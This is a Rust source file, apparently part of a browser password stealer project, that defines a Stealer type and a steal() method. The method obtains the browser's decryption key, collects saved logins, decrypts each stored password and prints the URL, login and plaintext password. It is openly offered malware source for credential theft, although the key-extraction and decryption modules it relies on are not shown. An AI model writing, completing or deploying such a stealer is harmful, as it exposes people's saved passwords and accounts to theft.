/**
 * This module contains implementation of Stealer.
 *
 * Max A.Jurankov (astronmax)
 */
use crate::data_stealers::{Data, DataStealer};
use crate::decryptors::Decryptor;
use crate::key_stealers::KeyStealer;

// Stealer structure.
// To use it you need to choose which KeyStealer, DataStealer
// and Decryptor your Stealer will use.
pub struct Stealer {
    key_stealer: Box<dyn KeyStealer>,
    data_stealer: Box<dyn DataStealer>,
    decryptor: Box<dyn Decryptor>,
}

impl Stealer {
    // Method to create new Stealer
    pub fn new(
        key_st: Box<dyn KeyStealer>,
        data_st: Box<dyn DataStealer>,
        dec: Box<dyn Decryptor>,
    ) -> Self {
        Stealer {
            key_stealer: key_st,
            data_stealer: data_st,
            decryptor: dec,
        }
    }

    // Method to steal credentials from browser
    pub fn steal(&self) {
        let key = self.key_stealer.get_key().unwrap();
        let mut credentials: Vec<Data> = Vec::new();
        self.data_stealer.get_data(&mut credentials);
        for data in credentials {
            // just print stealed data
            println!("--------------------------");
            println!("[+] FOUND PASSWORD");
            println!("[+] url: {}", data.url);
            println!("[+] login: {}", data.login);

            // create mutable buffer by cloning password from stealed Data
            let mut enc = data.password.clone();
            println!("[+] password: {}", self.decryptor.decrypt(&mut enc, &key));
        }
    }
}
